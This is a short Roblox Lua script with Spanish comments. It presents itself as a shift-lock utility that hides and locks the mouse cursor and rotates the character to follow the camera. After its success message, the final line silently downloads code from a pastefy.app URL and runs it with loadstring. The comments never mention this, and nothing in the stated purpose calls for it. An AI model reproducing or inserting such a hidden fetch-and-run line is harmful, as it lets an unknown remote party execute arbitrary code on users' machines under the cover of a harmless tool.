-- Shift Lock + Mouse oculto (solo script)
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local root = character:WaitForChild("HumanoidRootPart")

-- Esconder el ratón y bloquearlo en el centro
UIS.MouseIconEnabled = false
UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

-- Mantener Shift Lock activo + rotar el personaje
RunService.RenderStepped:Connect(function()
    UIS.MouseIconEnabled = false
    UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
    
    if humanoid and root and humanoid.Health > 0 then
        humanoid.AutoRotate = false
        local _, y = workspace.CurrentCamera.CFrame:ToEulerAnglesYXZ()
        root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, y, 0)
    end
end)

print("✅ Shift Lock + Mouse oculto activado")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()